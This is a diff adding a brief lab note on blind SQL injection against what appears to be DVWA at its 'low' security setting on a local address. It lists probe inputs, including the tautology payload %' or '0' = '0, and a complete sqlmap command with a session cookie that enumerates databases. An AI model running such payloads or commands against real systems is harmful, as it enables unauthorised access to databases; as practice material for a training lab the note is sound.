@@ -1,0 +1,9 @@
+sql injeciton blind  low : -
+
+1     ---- user id exists in the databse  
+'     ---- user id is missing from the databse
+%' or '0' = '0    --- user id exists in the databse 
+
+now perform attack: - 
+sqlmap -u "172.17.0.2/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=jusi9ccuu6qfk9m3tqdf103jo2; security=low" --dbs
+
